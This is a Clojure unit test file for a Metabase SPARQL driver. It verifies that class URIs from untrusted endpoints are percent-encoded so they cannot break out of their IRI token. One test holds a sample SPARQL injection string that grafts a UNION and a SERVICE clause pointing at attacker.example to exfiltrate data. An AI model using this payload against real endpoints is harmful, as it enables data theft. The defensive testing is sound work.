(ns metabase.driver.sparql.templates-test
  "Unit tests for the SPARQL query templates."
  (:require [clojure.string :as str]
            [clojure.test :refer :all]
            [metabase.driver.sparql.templates :as templates]))

(deftest class-properties-query-escapes-class-uri-test
  (testing "a well-formed class URI is embedded as-is"
    (is (str/includes? (templates/class-properties-query "https://example.org/Person")
                       "?instance a <https://example.org/Person>")))
  (testing "a class URI carrying IRIREF-illegal chars stays inside its <...> token"
    ;; Class URIs come from synced table names, i.e. from whatever the endpoint
    ;; returned — untrusted. Unescaped, the `>` below would close the IRIREF and
    ;; the rest would parse as query syntax, grafting a SERVICE clause that
    ;; exfiltrates data to an external endpoint.
    (let [evil  "https://ex.org/A> } UNION { ?s ?p ?o . SERVICE <http://attacker.example/> { ?s ?p ?o } #"
          query (templates/class-properties-query evil)
          ;; the IRIREF token: everything up to the first *unencoded* `>`
          iri   (second (re-find #"\?instance a (<[^>]*>)" query))]
      (testing "every char that could break out is percent-encoded"
        (is (str/includes? iri "%3E") "`>` encoded")
        (is (str/includes? iri "%7B") "`{` encoded")
        (is (str/includes? iri "%7D") "`}` encoded")
        (is (str/includes? iri "%20") "spaces encoded"))
      (testing "the payload never reaches the query as syntax"
        (is (not (str/includes? query "} UNION {")))
        (is (not (str/includes? query "SERVICE <http://attacker.example/>")))))))
